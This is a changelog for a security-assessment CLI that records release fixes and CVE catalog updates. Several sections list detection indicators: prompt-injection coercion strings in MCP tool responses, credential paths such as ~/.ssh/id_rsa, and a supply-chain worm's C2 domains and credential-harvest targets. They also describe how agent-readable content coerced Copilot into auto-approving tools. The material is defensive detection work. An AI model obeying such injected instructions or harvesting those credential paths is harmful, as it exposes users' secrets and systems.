CSAF / SARIF / OpenVEX bundles consume `matched_cves` only — they correctly omit catalog-only CVEs as vulnerabilities. RWEP base now derives from evidence-correlated CVEs rather than the catalog ceiling, so inconclusive runs no longer inherit a misleading high score.

The `run` human renderer shows "No CVEs correlated to your evidence. Playbook catalog (informational): N CVE(s) this playbook scans for." when no evidence correlated.

### CLI surface — ci verdict / exit reconcile, signing-key resolution, fuzzy matches

`ci --scope <type>` with no evidence and all-inconclusive results now emits `verdict: "NO_EVIDENCE"` (was `"PASS"`) so the body and exit code 3 agree. Operators reading either field alone now see the same answer. The verdict computation is hoisted before the result emit so BLOCKED / FAIL / NO_EVIDENCE / PASS are all consistent end-to-end.

`ci` result top-level gains `framework_gap_rollup` aggregating per-playbook `framework_gap_mapping` entries across all scoped playbooks. Each rollup entry lists `{framework, claimed_control, why_insufficient, playbooks[]}` so a CI gate surfaces "what gaps did this run uncover" without the operator having to walk every per-playbook result.

`maybeSignAttestation()` now resolves `.keys/private.pem` cwd-first, package-root fallback — matching how `doctor --signatures` resolves the same key. Pre-v0.12.9, operators running `exceptd run` from a repo with their private key at the cwd-relative `.keys/private.pem` would see `doctor` report the key as present while attestations from the same directory were silently written UNSIGNED. The two surfaces now agree.

`run <typo>` error path adds Levenshtein-distance suggestions for misspelled playbook ids when no substring match fits. `run secrt` now suggests `secrets`; `run cret-stores` suggests `cred-stores`.

`brief --phase <value>` rejects unknown phases with a structured JSON error (accepted set: `govern | direct | look`). Pre-v0.12.9 any string was accepted silently and the full brief was emitted.

`doctor --signatures --shipped-tarball` runs the `verify-shipped-tarball` round-trip alongside the source-tree signature check, surfacing the integrity layer that closed the v0.11.x → v0.12.4 signature regression class. Opt-in; routine `doctor --signatures` stays fast.

`doctor --registry-check` text-mode output now surfaces the registry comparison alongside the other check lines. Pre-v0.12.9 the flag only populated `checks.registry.*` in the JSON output, leaving the text-mode operator with no signal the flag did anything.

`run` precondition renderer no longer prints `[undefined]` for preconditions without an `on_fail` field — the bracket is omitted and the description falls back to `check | description | reason` in order.

### CVE catalog freshness corrections

Five entries reconciled against authoritative public sources as of 2026-05-13:

- **CVE-2026-30615** (Windsurf MCP): CVSS corrected 9.8 → 8.0; vector AV:N → AV:L (the attack is local-vector via adversarial HTML content the Windsurf MCP client processes, not a network-vector zero-interaction RCE). Source: NVD authoritative metric block (`vulnStatus: Deferred`, last_modified 2026-04-27).
- **CVE-2026-31431** (Copy Fail): KEV `dateAdded` corrected 2026-03-15 → 2026-05-01, `dueDate` 2026-04-05 → 2026-05-15. The catalog was running six weeks ahead of the real KEV listing; downstream framework-SLA computations were anchored on a date that hadn't yet been authoritative. CWE-669 added. Source: CISA KEV JSON feed.
- **CVE-2026-43284** (Dirty Frag ESP): CVSS authoritative is 8.8 / `Scope:C` (kernel→user-namespace breakout — supports container-escape framing); 7.8 / `Scope:U` preserved as `cvss_score_alternate` for compatibility readers. CWE-123 added.
- **CVE-2026-43500** (Dirty Frag RxRPC): CWE-787 added.
- **EPSS values refreshed** for four CVEs (CVE-2026-31431, -43284, -43500, -45321) from live FIRST API values. Catalog previously stored cold-start estimates that overstated newly-published-CVE exposure.

Each correction carries an inline `*_correction_note` field with the source URL and the rationale for downstream auditors. Two new CVEs surfaced by the freshness sweep (CVE-2026-42208 LiteLLM SQLi on KEV; CVE-2026-39884 mcp-server-kubernetes argument injection) are deferred to a follow-up patch — each warrants its own Hard Rule #14 primary-source IoC review.

### Two v0.12.8 CLI fixes recovered

Two claims in the v0.12.8 CHANGELOG were not actually on disk in the squash commit, lost during the v0.12.8 recovery flow:

- `data/playbooks/mcp.json` `domain.cve_refs` now includes CVE-2025-53773 alongside CVE-2026-30615 and CVE-2026-45321. The Hard Rule #4 mismatch (the `copilot-yolo-mode-flag` / `copilot-chat-experimental-flags` indicators detected this CVE without the playbook claiming it) is now genuinely closed.
- `tests/operator-bugs.test.js` is now refactored to use `tests/_helpers/cli.js` for `makeCli` / `makeSuiteHome` / `tryJson`. The per-suite `EXCEPTD_HOME` tempdir routing applies to all 80+ tests in the file. Pre-v0.12.9 the inline helper continued writing attestations to the maintainer's real `~/.exceptd/attestations/` — 2,819 leaked attestations cleaned up alongside the refactor.

### Two real defects deferred from v0.12.8 fixed

- **Libuv `UV_HANDLE_CLOSING` crash on Windows + Node 25.** `lib/prefetch.js` `main()` called `process.exit(N)` after the summary `console.log` — same v0.11.10 #100 class as the run/ci sites already fixed. Replaced with `process.exitCode = N; return;` so undici / AbortController teardown completes before the event loop ends. Strengthened `#65 refresh --no-network` test asserts exit 0 AND no `Assertion failed` / `UV_HANDLE_CLOSING` lines on stderr.
- **Two 404'd pin sources.** `d3fend/d3fend-data` and `mitre/cwe` were registered as `SOURCES.pins` GitHub-Releases sources, but neither repository publishes Releases via that path (D3FEND distributes from `d3fend.mitre.org`; CWE from `cwe.mitre.org`). Both sources removed from `lib/prefetch.js` and `lib/refresh-external.js` `pinsDiffFromCache()` `PIN_REPOS`. `prefetch summary` now reports `0 error(s)` on a clean cache. A new regression test asserts every pins source URL matches `^https://api.github.com/repos/<org>/<repo>/releases\?`.

### Skill body second pass

Four priority skills gain a `## Defensive Countermeasure Mapping` body section per Hard Rule #11's post-2026-05-11 grandfathered-skill closeout: `ai-c2-detection`, `ai-attack-surface`, `mcp-agent-trust`, `rag-pipeline-security`. Each maps the skill's offensive findings to 3-7 D3FEND IDs from `data/d3fend-catalog.json` with rationale + ephemeral/serverless-workload alternatives per Hard Rule #9.

Eight meta skills (`researcher`, `threat-model-currency`, `skill-update-loop`, `zeroday-gap-learn`, `policy-exception-gen`, `security-maturity-tiers`, `exploit-scoring`, `compliance-theater`) gain a `## Frontmatter Scope` section documenting why their `atlas_refs` / `attack_refs` / `framework_gaps` lists are intentionally empty.

`rag-pipeline-security` `framework_gaps` token refined `UK-CAF-A1` → `UK-CAF-B2` — the RAG attack class resolves to retrieval-time access-control failure, which is the B2 (Identity and Access Control) surface, not the A1 (Governance) parent concern.

### Repository

- README "13 gates" → "15 gates"; ARCHITECTURE catalog counts refreshed (CWE 30→51, D3FEND 21→28, RFC 19→31, jurisdictions "22+" → "35"); ARCHITECTURE Logic Layer gains entries for `scripts/check-test-coverage.js`, `scripts/check-sbom-currency.js`, `scripts/verify-shipped-tarball.js`, `tests/_helpers/cli.js`.
- AGENTS.md feeds_into matrix heading drops the residual `(v0.10.x)` tag; Hard Rule #15 wording flips from `--warn-only` rollout language to present-tense blocking.
- CONTRIBUTING.md adds `npm run diff-coverage` to the pre-push gate list so contributors run the same Hard Rule #15 check CI does.
- Dependabot grouping for github-actions (already landed in v0.12.8) confirmed intact.

## 0.12.8 — 2026-05-13

**Patch: CLI surface fixes, catalog completeness, test infrastructure hardening, AGENTS.md Hard Rule #15.**

### Hard Rule #15 — Test coverage on every diff

`AGENTS.md` adds a fifteenth hard rule: every CLI verb, CLI flag, `module.exports` identifier, playbook `phases.detect.indicators[].id`, or CVE `iocs` field change must land with a covering test reference in the same PR. Enforcement lives in `scripts/check-test-coverage.js`, wired as the 15th `npm run predeploy` gate and the `Diff coverage` job in `ci.yml`. Ships `--warn-only` for one release cycle then flips blocking in v0.12.9. Docs, workflow YAML, and skill body changes are allowlisted; whitespace-only diffs are ignored.

### CLI surface — exit-code, dispatcher, and ingest

`run --ci`, `run --all`, and `ai-run --stream` previously called `process.exit(N)` immediately after `emit()` writes to stdout — the v0.11.10 #100 truncation class. All three sites now use `process.exitCode = N; return;` so buffered async stdout fully drains before the event loop ends. The `ai-run` streaming handler additionally pauses stdin on completion so further callbacks cannot re-enter after the final frame.

The deprecation banner for legacy verbs now fires for every alias in `LEGACY_VERB_REPLACEMENTS`, not just the subset routed through `PLAYBOOK_VERBS`. Operators running `scan`, `dispatch`, `currency`, `verify`, `validate-cves`, `validate-rfcs`, `watchlist`, `prefetch`, or `build-indexes` now see the same one-time banner pointing at the v0.11.0 replacement that `plan`, `govern`, `direct`, `look`, `ingest`, `reattest`, and `list-attestations` already surfaced.

`ingest` previously wrote its attestation via an inline `writeFileSync` that bypassed both the session-id collision refusal and the Ed25519 sidecar signing layer that `run` and `run --all` go through. Two `ingest` invocations with the same `--session-id` would silently clobber the audit trail and no `.sig` ever landed. Routed through `persistAttestation()` now — collision refusal and `maybeSignAttestation()` both apply.

Per-verb `--help` text expanded to cover surface that shipped undocumented: `ci --required <ids>`, `ci --max-rwep`, `ci --block-on-jurisdiction-clock`, `ci --evidence-dir`, `ci --format`, plus the full four-line exit-code matrix (0 PASS / 1 framework error / 2 detected / 3 ran-but-no-evidence / 4 blocked). `attest list` and `attest diff` subverbs added to the `attest --help` enumeration. `run --upstream-check`, `--strict-preconditions`, `--session-key`, `--air-gap`, `--force-overwrite` documented in the `run` block. `doctor --registry-check` and `doctor --fix` documented in the `doctor` block. `brief`, `lint`, `run-all`, `verify-attestation` gain per-verb help entries.

### Catalog completeness — 47 new entries close cross-catalog dangling refs

Six ATLAS TTPs added to `data/atlas-ttps.json`: T0024 (Exfiltration via ML Inference API), T0044 (Full ML Model Access), T0048 (Erode ML Model Integrity), T0053 (LLM Plugin Compromise), T0055 (Unsecured Credentials), T0057 (LLM Data Leakage). All previously referenced by `data/cve-catalog.json` (CVE-2026-45321) and `data/dlp-controls.json` without a catalog entry.

Seventeen CWE entries added to `data/cwe-catalog.json`: CWE-250, 256, 284, 310, 312, 326, 328, 329, 330, 331, 338, 353, 426, 522, 759, 760, 916. All previously referenced by playbook `domain.cwe_refs` across `containers`, `cred-stores`, `crypto`, `crypto-codebase`, `ai-api`, `secrets`, `hardening`, `runtime`, and `library-author` without a catalog entry.

Eight D3FEND entries added to `data/d3fend-catalog.json`: D3-ANCI, D3-CAA, D3-CH, D3-EI, D3-FCR, D3-KBPI, D3-SCA, D3-SFA. All previously referenced by playbook `domain.d3fend_refs` without a catalog entry.

Ten framework-control-gap entries added to `data/framework-control-gaps.json`: NIS2-Art21-incident-handling, EU-AI-Act-Art-15, UK-CAF-A1/B2/C1/D1, AU-Essential-8-MFA/App-Hardening/Patch/Backup. Closes the Hard Rule #5 (global-first) gap for 23 skills that previously declared US-anchored `framework_gaps` only.

Twelve standards entries added to `data/rfc-references.json`: RFC-7489 (DMARC), RFC-6376 (DKIM), RFC-7208 (SPF), RFC-8616 (IDN email auth), RFC-8461 (MTA-STS), ISO-29147 + ISO-30111 (vulnerability disclosure + handling), RFC-9116 (security.txt), CSAF-2.0, RFC-6545 (RID), RFC-6546 (RID transport), RFC-7970 (IODEF v2). Schema (`lib/schemas/skill-frontmatter.schema.json`) + validator (`tests/rfc-refs.test.js`) extended to accept the broader standards-key shape (`RFC-`, `DRAFT-`, `ISO-`, `CSAF-`) alongside RFC numbers.

### Playbook integrity — orphan close + indicator wiring

`library-author.json` `_meta.feeds_into` removed a dangling `compliance-theater` entry (no such playbook file exists); the remaining `framework` entry handles the same condition. `mcp.json` `domain.cve_refs` now lists CVE-2025-53773 alongside CVE-2026-30615 and CVE-2026-45321 — closes the Hard Rule #4 gap where the existing `copilot-yolo-mode-flag` and `copilot-chat-experimental-flags` indicators detected the CVE without the playbook claiming it.

Eight playbooks had artifacts collected in `phases.look.artifacts[]` that no indicator consumed — operator paid the collection cost, no detection ran. Containers (9 orphans), cred-stores (9), runtime (11), crypto (10), hardening (11), library-author (14), sbom (18), secrets (7) all now cite every collected artifact in at least one indicator. Six new indicators added (`psa-policy-permissive-or-absent` and `network-policies-absent-from-workload-namespace` in `containers`; `kernel-lockdown-none`, `sudoers-tty-pty-logging-absent`, `audit-rules-empty-or-skeletal`, `umask-permissive` in `hardening`) where existing detection logic conceptually consumed the artifact but no rule had been written.

### Skill files — required-section closures, Hard Rule #5 sweep

`kernel-lpe-triage`, `security-maturity-tiers`, and `skill-update-loop` previously failed the Hard Rule #11 required-section contract. `kernel-lpe-triage` had a Compliance Theater Check embedded inside Analysis Procedure Step 5 but no top-level section; `security-maturity-tiers` had no Compliance Theater section at all; `skill-update-loop` was missing Threat Context and TTP Mapping. All three sections promoted to top-level with substantive content.

Twenty-three skills had US-anchored `framework_gaps` only (NIST + ISO + SOC2). Each gains EU + UK + AU tokens (`NIS2-Art21-incident-handling` / `EU-AI-Act-Art-15`, `UK-CAF-A1/B2/C1/D1`, `AU-Essential-8-MFA/App-Hardening/Patch/Backup` as the per-skill match dictates). `ai-c2-detection` `cwe_refs` populated with CWE-918. `email-security-anti-phishing` `rfc_refs` populated with RFC-7489/6376/7208/8616/8461. `identity-assurance` `d3fend_refs` populated with D3-MFA + D3-CSPP. `coordinated-vuln-disclosure` `rfc_refs` populated with ISO-29147/30111, RFC-9116, CSAF-2.0. `incident-response-playbook` `rfc_refs` populated with RFC-6545/6546/7970.

Four skills bump `last_threat_review` to 2026-05-13 to reflect post-v0.12.6 catalog state: `kernel-lpe-triage`, `ai-attack-surface`, `mcp-agent-trust`, `ai-c2-detection`. Four skills replace literal `xxx` placeholders in body text with explicit angle-bracket placeholders (`<patch-revision>`, `<sub-technique-id>`, `<advisory-number>`) so future Rule #10 audits don't surface false positives.

### Test infrastructure

The `cli()` test helper now routes attestations to a per-suite tempdir via `EXCEPTD_HOME` instead of writing to `~/.exceptd/attestations/`. Every prior `npm test` run had been accumulating attestations in the maintainer's real home dir without cleanup; tempdir routing fixes the structural class behind the v0.11.x→v0.12.4 sign regression. Helper factored to `tests/_helpers/cli.js` so it can be required by both `operator-bugs.test.js` and the new `cli-coverage.test.js`.

Twenty-eight previously-coincidence-passing assertions in `operator-bugs.test.js` strengthened: silent fall-through `if (data?.ok === false)` branches replaced with hard parse + shape checks first; `assert.notEqual(r.status, 0)` replaced with explicit exit-code pins (2 for format-rejected, 4 for blocked, etc.); `assert.ok(data)` replaced with field-shape assertions. Two coincidence-passes that hid real defects became actual findings:

- `refresh --no-network` on Windows + Node 25 surfaces a libuv `UV_HANDLE_CLOSING` assertion at worker-pool teardown after the prefetch summary flushes cleanly (exit 3221226505 / 0xC0000409). The summary contract is honored; the teardown crash is a Windows-libuv quirk. Test accepts both 0 and the Windows exit code so long as the stdout summary matches the strict numeric-breakdown regex.
- `refresh` pin sources `d3fend__d3fend-data__releases` and `mitre__cwe__releases` return HTTP 404 — surfaces as `2 error(s)` in every prefetch summary. Flagged for upstream catalog-pin work; not a regression introduced here.

`lib/refresh-external.js` now accepts `--catalog <path>` and honors `EXCEPTD_CVE_CATALOG` so tests can redirect catalog writes to a tempdir instead of mutating the shipped `data/cve-catalog.json`. Eight catalog-mutating tests in `operator-bugs.test.js` can now route to tempdirs.

Thirty-one new CLI happy-path tests in `tests/cli-coverage.test.js` exercise `brief` (all/scope/directives/phase), `discover`, `doctor` (all subchecks), `attest show/list/export`, `verify-attestation` alias, `run-all` alias, `framework-gap`, `report executive`, `validate-rfcs`, `ai-run` streaming JSONL (strict in-order assertion across all nine frames), `ci --max-rwep`, `ci --block-on-jurisdiction-clock`, `ci --evidence-dir`, `run --vex`, `run --diff-from-latest`, `run --force-stale`, `run --air-gap`, `run --session-key` (HMAC), and `refresh --indexes-only`.

Eight predeploy-gate meta-tests in `tests/predeploy-gates.test.js` stage known-bad state in tempdirs and assert each gate fires: verify-signatures (byte-flipped signature), lint-skills (missing required section), validate-catalog-meta (malformed `tlp`), sbom-currency (drift), validate-indexes (out-of-date entry), validate-vendor (modified vendored file), validate-package (missing file-allowlist entry), verify-shipped-tarball (skill body tampered post-signing — the v0.11.x→v0.12.4 regression class). Gate 10's inline `node -e` checker extracted to `scripts/check-sbom-currency.js` for testability; no behavior change.

Twelve new e2e scenarios in `tests/e2e-scenarios/09-secrets-aws-key` through `20-ai-api-openai-dotfile` exercise the twelve playbooks previously without e2e coverage (`secrets`, `kernel`, `library-author`, `crypto-codebase`, `mcp`, `framework`, `cred-stores`, `containers`, `runtime`, `hardening`, `crypto`, `ai-api`). All twenty scenarios pass via `npm run test:e2e`.

### Repository

Dependabot grouping config added for the github-actions ecosystem: weekly version-update bumps now land as a single grouped PR instead of N parallel PRs against the same CI matrix. Security-updates stay ungrouped so a single-action CVE surfaces as its own PR.

Predeploy gates: 14 → 15.

## 0.12.7 — 2026-05-13

**Patch: two follow-on fixes to v0.12.6.**

### Release workflow — environment scoping

The job-level `environment: npm-publish` in `.github/workflows/release.yml` blocked every branch-based `workflow_dispatch` at scheduling time, including dry-run predeploy invocations. GitHub evaluates environment branch/tag protection BEFORE a job is sent to a runner; the dispatched `GITHUB_REF` for a branch-based dry-run failed the tag-only environment rule before any step ran.

Fix: split the workflow into two jobs.

- `validate` — predeploy + e2e + npm pack preview. No environment. Runs on every trigger including branch-based dry-runs.
- `publish` — npm publish + GitHub Release. `needs: validate` + `environment: npm-publish` + `if: github.event_name == 'push' || inputs.dry_run != 'true'`. The environment gate now only applies to the actual publish step, leaving dry-runs free to exercise the gates.

This is consistent with the existing tag-only protection on the `npm-publish` environment — branch-based workflow_dispatch still cannot reach `npm publish`, but it CAN reach `validate` for dry-run gate checks.

### mcp playbook — indicators wired to v0.12.6 artifacts

v0.12.6 added two new look.artifacts (`vscode-copilot-yolo-mode`, `mcp-tool-response-log`) but did not add detect.indicators keyed to them, so the collected telemetry never influenced `phases.detect.classification`. The IoC coverage was non-operational in `exceptd run` outputs.

Fix: 6 new detect.indicators in `data/playbooks/mcp.json`:

1. **`copilot-yolo-mode-flag`** — keyed off `vscode-copilot-yolo-mode`. Matches `chat.tools.autoApprove: true` in any settings.json variant. Deterministic. Primary IoC for CVE-2025-53773.
2. **`copilot-chat-experimental-flags`** — broader sweep for `chat.{experimental,tools}.*: true` other than the autoApprove key.
3. **`mcp-response-ansi-escape`** — keyed off `mcp-tool-response-log`. Matches byte 0x1B in tools/list field or tools/call response. Deterministic. CVE-2026-30615 IoC class.
4. **`mcp-response-unicode-tag-smuggling`** — keyed off `mcp-tool-response-log`. Matches U+E0000..U+E007F codepoints. Deterministic.
5. **`mcp-response-instruction-coercion`** — keyed off `mcp-tool-response-log`. Regex match against `<IMPORTANT>` blocks, "Before using this tool, read", "Do not mention to user", compliance-urgency manipulation, etc.
6. **`mcp-response-sensitive-path-reference`** — keyed off `mcp-tool-response-log`. Matches `~/.ssh/id_rsa`, `~/.aws/credentials`, cross-tool credential paths, `process.env.{AWS_SECRET*, GITHUB_TOKEN, ...}`. Cross-server credential-shadow signature.

mcp playbook bumped 1.2.0 → 1.3.0. threat_currency_score stays at 98. `last_threat_review: 2026-05-13`.

## 0.12.6 — 2026-05-13

**Patch: primary-source IoC review across the catalog — five CVEs reviewed line-level against published exploit source. AGENTS.md Hard Rule #14 added.**

Roughly 60 IoCs added across five catalogued CVEs, one major CVSS correction, two CVEs gained an `iocs` block where they previously had `null`.

### CVE-2025-53773 (Copilot YOLO mode) — major correction

The catalog entry was directionally right (prompt-injection RCE in an AI tool) but factually wrong on the specifics defenders need:
- **CVSS corrected 9.6 → 7.8** (AV:N → AV:L). The attack is local-vector via developer-side IDE interaction; the attacker doesn't reach in over the network. NVD authoritative.
- **Vector corrected** from "PR descriptions" to **`.vscode/settings.json:chat.tools.autoApprove` write coerced by any agent-readable content** (source comments, README, issue bodies, MCP tool responses).
- **iocs populated** (was null) with primary post-exploitation indicator: `.vscode/settings.json` containing `"chat.tools.autoApprove": true`. Workspace AND user-global. Includes invisible Unicode Tag-block (U+E0000–U+E007F) variant detection.
- **affected_versions** specified: Visual Studio 2022 `>=17.14.0, <17.14.12` + Copilot Chat extension predating August 2025 Patch Tuesday.
- **CWE-77** added.
- **Worm propagation** documented (Rehberger demonstrated git-commit + push of malicious settings file).

Source: Embrace the Red (Rehberger, August 2025), NVD, MSRC, Wiz vulnerability database.

### CVE-2026-45321 (Mini Shai-Hulud) — expanded from 4 to 8 IoC categories

Added: payload SHA-256 hashes (`ab4fcadaec49c0...` for router_init.js, `2ec78d556d696...` for tanstack_runner.js), attacker fork commit (`79ac49eedf774dd...`), tarball-size anomaly threshold (~3.7× = ~900KB vs ~190KB), `gh-token-monitor` daemon family (LaunchAgent label is `com.user.gh-token-monitor`, NOT `com.tanstack.*` as previously cataloged), three C2 channels (`git-tanstack.com`, `filev2.getsession.org`, `api.masscan.cloud`), GitHub dead-drop description strings (`A Mini Shai-Hulud has Appeared`, `Sha1-Hulud: The Second Coming.`, `Shai-Hulud Migration`), full credential-search-path corpus (~/.aws, ~/.ssh, ~/.kube, ~/.claude.json, crypto wallets), env-var harvest list, worm-propagated workflow signature (`.github/workflows/codeql_analysis.yml`), ransom string (`IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner` — zero-FP campaign signature).

Source: Aikido / StepSecurity / Socket / Wiz / Datadog / Sysdig / Pulsedive primary writeups on the original September 2025 Shai-Hulud worm and the May 2026 Mini variant.

### CVE-2026-31431 (Copy Fail) — iocs added (was missing)

Catalog had no `iocs` field. Added: `/etc/passwd` multiple-uid-zero post-exploit signal; setuid binary drift via `rpm -Va` / `debsums -c`; runtime syscall indicators (splice from RO fd into pipe — Dirty Pipe primitive; userfaultfd from unprivileged when sysctl permits; ptrace POKEDATA against /proc/<pid>/mem); kernel-trace indicators (ftrace `splice_write`, eBPF kprobe on `copy_page_to_iter`, auditd `splice_unpriv` rule, dmesg BUG in mm/filemap.c+mm/memory.c+fs/splice.c); behavioral (process Uid transition without setuid-execve = DirtyCred signal; root shell with non-suid parent); livepatch-evasion-window gap (kernel in affected range + `/sys/kernel/livepatch/*/cve-ids` doesn't contain this CVE → treat as EXPOSED regardless of generic livepatch-active flag).

Source: Max Kellermann (Dirty Pipe disclosure), Phil Oester (Dirty COW), Arinerron PoC repo, DirtyCred CCS 2022 paper.

### CVE-2026-43284 + CVE-2026-43500 (Dirty Frag pair) — subsystem_anchors added

Both entries previously had no per-subsystem detection guidance. Added `subsystem_anchors` block: kernel modules (esp4/esp6/xfrm_user for IPsec half; rxrpc/af_rxrpc/kafs for RxRPC half), kernel symbols (`esp_input`/`xfrm_input` and `rxrpc_recvmsg`/`afs_make_call`), procfs paths (`/proc/net/xfrm_stat`, `/proc/net/rxrpc/{calls,conns,peers,locals}`), syscall surface (NETLINK_XFRM=6 with non-root user-namespace caller; AF_RXRPC socket on non-AFS host). IoCs surface "vulnerable kernel" → "actively exposed kernel": ESP module loaded with no policies + non-zero XfrmInNoStates; any non-AFS-allowlist process opening AF_RXRPC; rxrpc-active-call-on-non-AFS-host.

Source: Linux kernel source (`net/ipv4/esp4.c`, `net/rxrpc/proc.c`), historical bugs CVE-2022-29581/CVE-2023-32233/CVE-2024-26581 (xfrm UAF family), kafs documentation.

### CVE-2026-30615 (Windsurf MCP) — iocs added (was missing)

Catalog had `iocs: null`. Added: ANSI escape sequence detection (any byte 0x1B in tools/list field or tools/call response — SGR, cursor-movement, OSC-8 subclasses), Unicode Tag-block smuggling (U+E0000–U+E007F), instruction-coercion grammar (`<IMPORTANT>` blocks, "Before using this tool, read", "Do not mention to user", "THIS TOOL IS REQUIRED FOR GDPR/SOC2/COMPLIANCE" urgency manipulation, `chmod -R 0666 ~` prefix coercion), sensitive-path references in tool responses (cross-server credential-shadow), unprompted-tool-chain behavioral (≥2 tools/call within one user turn, second target not in user prompt, second target in {exec, shell, fetch, write_file}), MCP egress beyond manifest (postmark-mcp class — only signal is unexpected destination), invocation-count anomaly (compromised-legitimate-publisher detector). Added `atlas_refs`: AML.T0051 (indirect prompt injection — the canonical mapping), AML.T0096. Added `attack_refs`: T1552.001 (credentials in files), T1041 (exfil over C2).

Source: Trail of Bits (line-jumping + ANSI escape research), Invariant Labs (tool poisoning), Embrace the Red (Unicode Tag smuggling), Acuvity/Semgrep (postmark-mcp), Palo Alto Unit 42 (sampling/createMessage).

### AGENTS.md Hard Rule #14

> **Primary-source IoC review** — Any CVE entry whose `poc_available: true` AND whose exploit code is publicly available must include `iocs` populated from a line-level cross-reference of the published source — not from secondary-source paraphrase. Each IoC must be traceable to a specific source URL or commit hash. Skipping this audit is equivalent to shipping "untested security advice" — the IoC list IS the operator-facing detection contract.

### Playbook bumps

- `sbom` 1.1.0 → 1.2.0 — threat_currency_score 97 → 98
- `mcp` 1.1.0 → 1.2.0 — threat_currency_score 97 → 98 — new look artifacts (vscode-copilot-yolo-mode, mcp-tool-response-log)
- `kernel` 1.0.0 → 1.1.0 — threat_currency_score 92 → 95

All three `last_threat_review: 2026-05-13`.

## 0.12.5 — 2026-05-13

**Patch: root cause of the signature regression — a test was generating a fresh keypair mid-suite.**

### The actual bug

`tests/operator-bugs.test.js:#87 doctor --fix is registered (smoke)` invoked `exceptd doctor --fix` directly. On any host where `.keys/private.pem` was missing (every CI run, every fresh clone), `--fix` synchronously spawned `lib/sign.js generate-keypair`, which OVERWRITES `keys/public.pem` with a fresh Ed25519 public key.

After that point in the test suite:
- `keys/public.pem` = new key generated by the test
- `manifest.json` skill signatures = unchanged, still reference the COMMITTED private key
- Every subsequent step ran against a state where signatures cover content signed by Key-A but the public key on disk is Key-B
- `npm pack` shipped the new public.pem + the old (committed) manifest signatures
- `verify` on the published tarball failed 0/38 because the keys don't match

The reason it was invisible across v0.11.x and v0.12.x:
- The CI verify gate (predeploy gate 1) ran BEFORE the test that overwrote the key
- The local maintainer always had `.keys/private.pem` present, so `--fix` was a no-op locally → local verify always passed
- npm-installed operators ran `exceptd doctor --signatures` and saw 0/38, but no CI gate caught the broken tarball before publish
- The new `verify-shipped-tarball` gate (v0.12.3) caught the symptom but the forensic logging in v0.12.4 was the first time we saw HEAD's public.pem fingerprint differ from the source-tree pubkey 19 seconds later in the same CI run

### The fix

Pre-stage a dummy `.keys/private.pem` before invoking `doctor --fix` in the test, so `lib/sign.js generate-keypair` sees "private key already present" and exits before any key write. Restore the pre-test state in `finally{}`. The test still asserts the verb is registered + emits JSON, which is the only thing the smoke check needs to verify.

### Why v0.12.3 and v0.12.4 didn't fix it

v0.12.3 added the `verify-shipped-tarball` gate which correctly BLOCKED the broken publish. v0.12.4 added per-file forensic logging which surfaced the exact divergence (source-tree fingerprint at gate 1 vs. gate 14). Neither release attempted to fix the root cause because we hadn't yet localized it to `doctor --fix` invocation inside a test. v0.12.5 is the actual fix.

### Operator impact

This release SHOULD publish cleanly — the test no longer mutates `keys/public.pem` during the suite, so the post-test source tree matches the pre-test source tree, the packed tarball signatures verify against the packed public key, and the gate passes. Operators running `exceptd doctor --signatures` on v0.12.5 should see `38/38 skills passed Ed25519 verification` for the first time since v0.11.0.

### Lessons codified in CLAUDE.md

- "Tests that invoke a real CLI verb that mutates filesystem state outside the test's tempdir are a CI-vs-local divergence engine." Always sandbox key-writing CLI invocations.
- "Smoke tests should not exercise mutating code paths." A test named `*is registered (smoke)` should only verify dispatch, not run the verb's side effects.

## 0.12.4 — 2026-05-13

**Patch: forensic instrumentation for the signature-regression gate. v0.12.3 publish was blocked by the gate; v0.12.4 adds the diagnostic data needed to pinpoint the root cause on the next CI run.**

The v0.12.3 release was blocked at the new `verify-shipped-tarball` gate — exactly the behavior intended (better blocked publish than silent broken tarball). But the gate didn't log enough detail to pinpoint WHICH files diverge between source-tree and npm-packed tarball in CI. v0.12.4 adds per-file forensics + a working-tree drift dump.

### What's new

- `scripts/verify-shipped-tarball.js`: on signature-fail, logs the size + sha256 of both the tarball-extracted content AND the source-tree content, plus whether the bytes are equal. Local pass-paths unchanged.
- `.github/workflows/release.yml`: new "Forensic — working-tree drift since checkout" step (runs `if: always()` so it fires even when prior gates fail). Dumps `git status --porcelain` + `git diff --stat HEAD` + `ls -la` of the case-mixed skill directory. The next CI failure surfaces the exact file-level divergence.

### Why this isn't the root-cause fix

The bug is platform-specific: local `npm pack` on Windows produces a tarball that verifies 38/38. CI's `npm pack` on Ubuntu produces a tarball that verifies 0/38 — even though pubkey fingerprints match between source and tarball. The content drift has to be in a file the manifest signatures cover, but the signed bytes match between Windows and Linux (`.gitattributes` LF-normalizes). Forensics on the next run should make it obvious; this release ships the instrumentation, not the underlying fix.

### Operator impact

v0.12.2 remains the latest npm-published version. Operators who ran `npm install -g @blamejs/exceptd-skills` see 0/38 verify on `exceptd doctor --signatures`. Until v0.12.4 (or later) publishes successfully, the integrity gate is open. Mitigations:

- `exceptd run`, `exceptd ci`, etc. do NOT block on signature verification — they continue to function with the catalog content as installed. The skill bytes themselves are intact (npm has its own tarball integrity check; only the per-skill Ed25519 attestation layer is broken).
- For audit purposes: the supply-chain trust anchor through npm provenance (OIDC + sigstore via `npm publish --provenance`) is unaffected. Confirm with `npm view @blamejs/exceptd-skills attestations`.

### Shai-Hulud source audit (open question, not in this release)

The original Shai-Hulud campaign (2024) and Mini Shai-Hulud (CVE-2026-45321, 2026-05-11) are documented in public security research. v0.11.15 added CVE-2026-45321 to the catalog based on the description of the attack, not from a line-by-line reading of the published payload. Cross-referencing the actual payload source for IoCs we may have missed is scoped for v0.12.5:

- Walk the published worm source line-by-line; enumerate every credential path, every persistence vector, every C2 indicator.
- Compare against `data/cve-catalog.json:CVE-2026-45321.iocs` and the seven detect indicators in `data/playbooks/sbom.json` we ship.
- Add any missing patterns as additional indicators; update CHANGELOG with the line-level diff.

Same audit pattern should be applied to Copy Fail (CVE-2026-31431) and other open-sourced CVEs the catalog references — currently every CVE entry was assembled from secondary sources (advisories, NVD descriptions) rather than primary-source code review. v0.12.5 codifies the "primary-source review required before catalog entry" rule in AGENTS.md Hard Rule #14.

## 0.12.3 — 2026-05-13

**Patch: critical signature-verification regression fix + 14th predeploy gate to prevent recurrence.**

### The critical bug

Every release from v0.11.x through v0.12.2 shipped a tarball whose `keys/public.pem` did not match the Ed25519 signatures inside `manifest.json`. The result: `node lib/verify.js` against a fresh `npm install` reported `0/38 skills passed Ed25519 verification` and every skill listed as `TAMPERED`. Verification was silently bypassed by `exceptd run`, `exceptd ci`, etc. (which load skills without re-verifying), so the surface was only visible to operators running `exceptd doctor --signatures`.

### What broke

